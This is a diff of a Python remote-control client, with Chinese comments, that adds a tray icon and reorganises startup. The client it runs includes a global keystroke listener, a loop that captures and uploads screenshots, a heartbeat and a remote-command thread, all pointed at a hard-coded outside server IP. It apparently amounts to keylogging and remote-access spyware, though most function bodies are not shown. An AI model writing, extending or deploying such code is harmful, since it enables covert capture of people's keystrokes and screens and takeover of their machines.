@@ -8,11 +8,20 @@ import mss
 import io
 from PIL import Image
 import sys
+import pystray
+from pystray import MenuItem
 
+# ====================== 你的原配置 ======================
 SERVER = "http://121.43.63.34:5800"
 CID = str(uuid.uuid4())[:8]
 KEY = Controller()
 
+# ====================== 托盘退出函数 ======================
+def quit_app(icon, item):
+    icon.stop()
+    sys.exit(0)
+
+# ====================== 你的业务代码 ======================
 def check_and_upload_screen():
     while True:
         try:
@@ -67,13 +76,32 @@ def on_press(k):
     except:
         pass
 
-if __name__ == "__main__":
-    print(f"客户端ID: {CID}")
-    if sys.platform == "darwin":
-        print("Mac → 屏幕录制 + 辅助功能权限")
-    
+# ====================== 启动所有后台任务 ======================
+def start_background_tasks():
+    # 启动键盘监听
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+
+    # 启动你的后台线程
     threading.Thread(target=heartbeat, daemon=True).start()
     threading.Thread(target=check_and_upload_screen, daemon=True).start()
     threading.Thread(target=remote_cmd, daemon=True).start()
-    with keyboard.Listener(on_press=on_press) as lst:
-        lst.join()
+
+# ====================== 托盘主程序（必须放主线程） ======================
+if __name__ == "__main__":
+    # 先启动所有后台功能
+    start_background_tasks()
+
+    # 托盘必须在主线程！修复 Mac 报错
+    image = Image.new('RGB', (64, 64), 'blue')
+    menu = (MenuItem('退出', quit_app),)
+
+    icon = pystray.Icon(
+        "remote_client",
+        image,
+        "远程控制客户端",
+        menu
+    )
+
+    # 主线程运行托盘
+    icon.run()
